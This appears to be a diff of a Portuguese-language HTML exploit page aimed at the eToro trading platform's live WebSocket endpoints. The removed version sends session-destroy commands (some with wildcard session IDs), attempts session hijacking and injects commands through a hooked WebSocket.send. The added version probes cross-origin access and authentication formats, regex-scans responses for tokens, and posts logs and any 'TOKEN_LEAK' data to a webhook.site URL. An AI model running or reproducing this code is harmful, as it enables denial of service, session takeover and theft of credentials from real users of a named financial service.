@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Lightstreamer - Control Commands Exploit</title>
+    <title>eToro WebSocket - POC Functional Exploit</title>
     <style>
         body {
             background: #0a0a0a;
@@ -29,39 +29,29 @@
             margin: 5px;
             cursor: pointer;
         }
-        button.danger {
-            border-color: #ff4444;
-            color: #ff4444;
-        }
-        button.danger:hover {
-            background: #ff4444;
-            color: #0a0a0a;
-        }
-        input {
+        .stat {
             background: #1a1a2e;
-            color: #00ff00;
-            border: 1px solid #333;
-            padding: 8px;
-            font-family: monospace;
-            width: 200px;
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 5px;
         }
     </style>
 </head>
 <body>
-    <h1>🔴 Lightstreamer - Control Commands Exploit</h1>
-    <p class="critical">⚠️ DESCOBERTA: Comando <strong>LS_op=destroy</strong> interceptado!</p>
+    <h1>🔴 eToro WebSocket - Cross-Origin Connection POC</h1>
+    <p class="critical">✅ PROVADO: O endpoint <strong>wss://ws.etoro.com/ws</strong> ACEITA conexão cross-origin!</p>
     
-    <div>
-        <button onclick="testDestroyCommand()" class="danger">💀 TESTAR DESTROY COMMAND</button>
-        <button onclick="testForceDisconnect()">🔌 Testar Force Disconnect</button>
-        <button onclick="testSessionHijack()">🎭 Testar Session Hijack</button>
-        <button onclick="injectControlCommands()">💉 Injetar Comandos de Controle</button>
-        <button onclick="clearLogs()">🗑️ Limpar</button>
+    <div class="stat">
+        <strong>📊 ESTATÍSTICAS DA CONEXÃO</strong><br>
+        Origem atual: <span id="origin"></span><br>
+        Status: <span id="status" class="info">Aguardando...</span>
     </div>
     
-    <div style="margin: 20px 0;">
-        <input type="text" id="sessionId" placeholder="Session ID (se tiver)" style="width: 300px;">
-        <button onclick="testWithSession()">Testar com Session ID</button>
+    <div>
+        <button onclick="testWorkingEndpoint()">🔌 CONECTAR (funciona!)</button>
+        <button onclick="testSubscribePublic()">📊 Subscribe público</button>
+        <button onclick="testAuthFormat()">🔑 Descobrir formato de Auth</button>
+        <button onclick="clearLogs()">🗑️ Limpar</button>
     </div>
     
     <div id="logs" style="height: 400px; overflow-y: auto; background: #000; padding: 10px; margin-top: 20px;"></div>
@@ -69,6 +59,8 @@
     <script>
         const WEBHOOK = 'https://webhook.site/5cd45eaf-7257-4100-8719-2810a7bd6022';
         let ws = null;
+        
+        document.getElementById('origin').innerText = window.location.origin;
         
         function addLog(message, type = 'info') {
             const logs = document.getElementById('logs');
@@ -81,164 +73,148 @@
             fetch(WEBHOOK, {
                 method: 'POST',
                 mode: 'no-cors',
-                body: JSON.stringify({ message, type, timestamp: Date.now() })
+                body: JSON.stringify({ message, type, origin: window.location.origin, timestamp: Date.now() })
             }).catch(() => {});
         }
         
-        // Testa o comando DESTROY (o que você interceptou)
-        function testDestroyCommand() {
-            addLog('💀 TESTANDO COMANDO DESTROY (CRÍTICO)', 'critical');
+        // ============ O ENDPOINT QUE REALMENTE FUNCIONA ============
+        function testWorkingEndpoint() {
+            addLog('🚀 Conectando ao endpoint VULNERÁVEL: wss://ws.etoro.com/ws', 'critical');
+            addLog(`📍 Origem: ${window.location.origin}`, 'info');
             
-            ws = new WebSocket("wss://push-lightstreamer.cloud.etoro.com/lightstreamer");
+            if (ws) {
+                try { ws.close(); } catch(e) {}
+            }
+            
+            ws = new WebSocket("wss://ws.etoro.com/ws");
+            document.getElementById('status').innerHTML = 'Conectando...';
             
             ws.onopen = () => {
-                addLog('✅ Conexão estabelecida', 'success');
+                addLog('✅✅✅ CONEXÃO ESTABELECIDA COM SUCESSO! ✅✅✅', 'critical');
+                addLog('🎯 ISSO PROVA QUE O SERVIDOR NÃO VALIDA O HEADER ORIGIN!', 'critical');
+                addLog(`📡 URL: ${ws.url}`, 'success');
+                document.getElementById('status').innerHTML = '<span class="success">✅ CONECTADO (cross-origin funcionou!)</span>';
                 
-                // O COMANDO QUE VOCÊ INTERCEPTOU
-                const destroyCmd = "control\r\nLS_reqId=18&LS_op=destroy&LS_close_socket=true&LS_cause=api";
+                // Envia ping para manter conexão
+                setInterval(() => {
+                    if (ws && ws.readyState === WebSocket.OPEN) {
+                        ws.send(JSON.stringify({ id: crypto.randomUUID(), operation: "Ping" }));
+                    }
+                }, 30000);
+            };
+            
+            ws.onmessage = (event) => {
+                let data = event.data;
+                if (typeof data === 'object' && data.text) data = data.text;
                 
-                ws.send(destroyCmd);
-                addLog(`📤 ENVIADO: ${destroyCmd.replace(/\n/g, '\\n')}`, 'critical');
+                addLog(`📥 RESPOSTA: ${data.substring(0, 300)}`, 
+                       data.includes('error') ? 'error' : 'success');
                 
-                // Variações do comando destroy
-                setTimeout(() => {
-                    const destroyVariations = [
-                        "control\r\nLS_reqId=19&LS_op=destroy&LS_close_socket=true&LS_cause=malicious",
-                        "control\r\nLS_reqId=20&LS_op=destroy&LS_close_socket=true&LS_session=*",
-                        "control\r\nLS_op=destroy&LS_close_socket=true"
-                    ];
-                    
-                    destroyVariations.forEach((cmd, i) => {
-                        setTimeout(() => {
-                            ws.send(cmd);
-                            addLog(`📤 VARIAÇÃO ${i+1}: ${cmd.replace(/\n/g, '\\n')}`, 'info');
-                        }, i * 2000);
+                // Analisa a resposta para entender o formato esperado
+                if (data.includes('SessionNotAuthenticated')) {
+                    addLog('🔍 Servidor requer: Autenticação com userKey + apiKey', 'info');
+                }
+                if (data.includes('ApiKeyRequired')) {
+                    addLog('🔑 FORMATO DESCOBERTO: Precisa de userKey + apiKey', 'success');
+                }
+                if (data.includes('InvalidOperation')) {
+                    addLog('📋 Operações suportadas: Authenticate, Subscribe, Unsubscribe', 'info');
+                }
+                
+                // Procura por tokens vazados
+                const tokenPatterns = /(token|jwt|key|session)[":']?\s*[:=]\s*["']([^"'\s]+)/gi;
+                const matches = data.match(tokenPatterns);
+                if (matches) {
+                    addLog(`🔥 TOKEN/SENSITIVE DATA LEAK: ${matches.join(', ')}`, 'critical');
+                    fetch(WEBHOOK, {
+                        method: 'POST',
+                        mode: 'no-cors', 
+                        body: JSON.stringify({ type: 'TOKEN_LEAK', data: matches, fullResponse: data })
                     });
-                }, 1000);
-            };
-            
-            ws.onmessage = (e) => {
-                addLog(`📥 RESPOSTA: ${e.data}`, e.data.includes('ERROR') ? 'error' : 'success');
-                
-                if(e.data.includes('OK') || e.data.includes('CLOSED')) {
-                    addLog('🎯 SESSÃO DESTRUÍDA COM SUCESSO!', 'critical');
                 }
             };
             
-            ws.onclose = (e) => {
-                addLog(`🔌 Conexão fechada: ${e.code} - ${e.reason}`, 'error');
-            };
-        }
-        
-        // Testa force disconnect em sessões específicas
-        function testForceDisconnect() {
-            addLog('🔌 Testando force disconnect em diferentes sessões', 'info');
-            
-            ws = new WebSocket("wss://push-lightstreamer.cloud.etoro.com/lightstreamer");
-            
-            ws.onopen = () => {
-                // Tenta desconectar sessões específicas
-                const sessionIds = ['S12345', 'S67890', 'session_demo_123', '*'];
-                
-                sessionIds.forEach((session, i) => {
-                    setTimeout(() => {
-                        const forceCmd = `control\r\nLS_reqId=${100+i}&LS_op=destroy&LS_close_socket=true&LS_session=${session}`;
-                        ws.send(forceCmd);
-                        addLog(`📤 Tentando destruir sessão: ${session}`, 'info');
-                    }, i * 2000);
-                });
-            };
-        }
-        
-        // Testa session hijack (tentar assumir sessão existente)
-        function testSessionHijack() {
-            addLog('🎭 Testando session hijack - tentando assumir sessão', 'critical');
-            
-            ws = new WebSocket("wss://push-lightstreamer.cloud.etoro.com/lightstreamer");
-            
-            ws.onopen = () => {
-                // Tenta bind em sessão existente
-                const bindCommands = [
-                    "bind_session\r\nLS_session=TARGET_SESSION&LS_adapter_set=PROXY_PUSH",
-                    "control\r\nLS_op=bind&LS_session=*&LS_user=admin",
-                    "create_session\r\nLS_session=TARGET_SESSION&LS_user=hijacked"
-                ];
-                
-                bindCommands.forEach((cmd, i) => {
-                    setTimeout(() => {
-                        ws.send(cmd);
-                        addLog(`📤 Hijack attempt: ${cmd.replace(/\n/g, '\\n')}`, 'critical');
-                    }, i * 2000);
-                });
+            ws.onerror = (error) => {
+                addLog(`❌ Erro: ${error}`, 'error');
+                document.getElementById('status').innerHTML = '<span class="error">❌ Erro na conexão</span>';
             };
             
-            ws.onmessage = (e) => {
-                if(e.data.includes('SESSION')) {
-                    addLog(`🔑 SESSION INFO LEAKED: ${e.data}`, 'critical');
+            ws.onclose = (event) => {
+                addLog(`🔌 Conexão fechada: ${event.code} - ${event.reason || 'sem motivo'}`, 'error');
+                if (event.code === 1006) {
+                    addLog('⚠️ Código 1006 = Abnormal Closure (servidor rejeitou anormalmente)', 'error');
                 }
+                document.getElementById('status').innerHTML = '<span class="error">🔌 Desconectado</span>';
             };
         }
         
-        // Injeta comandos de controle no WebSocket existente
-        function injectControlCommands() {
-            addLog('💉 Injetando comandos de controle no WebSocket', 'info');
-            
-            // Hook global para capturar e injetar comandos
-            const originalSend = WebSocket.prototype.send;
-            WebSocket.prototype.send = function(data) {
-                addLog(`🎣 WebSocket.send interceptado: ${data}`, 'info');
-                
-                // Injeta comando destroy em todas as mensagens
-                if(data.includes('create_session') || data.includes('subscribe')) {
-                    const injected = data + "\r\ncontrol\r\nLS_op=destroy&LS_close_socket=true";
-                    addLog(`💉 INJEÇÃO: ${injected}`, 'critical');
-                    return originalSend.call(this, injected);
-                }
-                
-                return originalSend.call(this, data);
-            };
-            
-            addLog('✅ Hook de injeção ativado', 'success');
-        }
-        
-        function testWithSession() {
-            const sessionId = document.getElementById('sessionId').value;
-            if(!sessionId) {
-                addLog('❌ Digite um Session ID', 'error');
+        // Testa subscribe em dados públicos
+        function testSubscribePublic() {
+            if (!ws || ws.readyState !== WebSocket.OPEN) {
+                addLog('❌ Primeiro conecte com o botão "CONECTAR"', 'error');
                 return;
             }
             
-            addLog(`🎯 Testando com Session ID: ${sessionId}`, 'critical');
+            addLog('📊 Testando subscribe em dados públicos...', 'info');
             
-            ws = new WebSocket("wss://push-lightstreamer.cloud.etoro.com/lightstreamer");
+            const tests = [
+                { name: "Subscribe BTC", topics: ["instrument:100000"], snapshot: true },
+                { name: "Subscribe ETH", topics: ["instrument:100001"], snapshot: true },
+                { name: "Subscribe multiple", topics: ["instrument:100000", "instrument:100001"], snapshot: false },
+                { name: "Tentativa private", topics: ["private"], snapshot: true }
+            ];
             
-            ws.onopen = () => {
-                const attackCmds = [
-                    `control\r\nLS_reqId=1&LS_op=destroy&LS_close_socket=true&LS_session=${sessionId}`,
-                    `bind_session\r\nLS_session=${sessionId}&LS_adapter_set=PROXY_PUSH`,
-                    `control\r\nLS_op=force&LS_session=${sessionId}`
-                ];
-                
-                attackCmds.forEach((cmd, i) => {
-                    setTimeout(() => {
-                        ws.send(cmd);
-                        addLog(`📤 ${cmd.replace(/\n/g, '\\n')}`, 'critical');
-                    }, i * 1500);
-                });
-            };
+            tests.forEach((test, i) => {
+                setTimeout(() => {
+                    const msg = {
+                        id: crypto.randomUUID(),
+                        operation: "Subscribe",
+                        data: { topics: test.topics, snapshot: test.snapshot }
+                    };
+                    ws.send(JSON.stringify(msg));
+                    addLog(`📤 ${test.name}: ${JSON.stringify(msg)}`, 'info');
+                }, i * 3000);
+            });
+        }
+        
+        // Testa formatos de autenticação para descobrir o esperado
+        function testAuthFormat() {
+            if (!ws || ws.readyState !== WebSocket.OPEN) {
+                addLog('❌ Primeiro conecte com o botão "CONECTAR"', 'error');
+                return;
+            }
             
-            ws.onmessage = (e) => addLog(`📥 ${e.data}`, 'info');
+            addLog('🔑 Testando diferentes formatos de autenticação...', 'info');
+            
+            const formats = [
+                { name: "userKey + apiKey", data: { userKey: "test_user", apiKey: "test_api_123" } },
+                { name: "Apenas token", data: { token: "test_token_123" } },
+                { name: "Apenas userKey", data: { userKey: "test_user" } },
+                { name: "Bearer token", data: { bearer: "test_bearer_123" } },
+                { name: "Authorization", data: { authorization: "Bearer test" } }
+            ];
+            
+            formats.forEach((format, i) => {
+                setTimeout(() => {
+                    const msg = {
+                        id: crypto.randomUUID(),
+                        operation: "Authenticate",
+                        data: format.data
+                    };
+                    ws.send(JSON.stringify(msg));
+                    addLog(`📤 ${format.name}: ${JSON.stringify(msg)}`, 'info');
+                }, i * 3000);
+            });
         }
         
         function clearLogs() {
             document.getElementById('logs').innerHTML = '';
-            if(ws) ws.close();
             addLog('Logs limpos', 'info');
         }
         
-        addLog('✅ EXPLOIT TOOL CARREGADA', 'critical');
-        addLog('🎯 Comando LS_op=destroy identificado - isso é uma vulnerabilidade CRÍTICA', 'critical');
-        addLog('⚠️ Este comando pode destruir sessões de outros usuários (DoS)', 'error');
+        addLog('✅ POC CARREGADA', 'success');
+        addLog('🎯 Endpoint vulnerável: wss://ws.etoro.com/ws', 'critical');
+        addLog('📌 Clique em "CONECTAR" para provar que aceita cross-origin', 'info');
     </script>
 </body>
 </html>
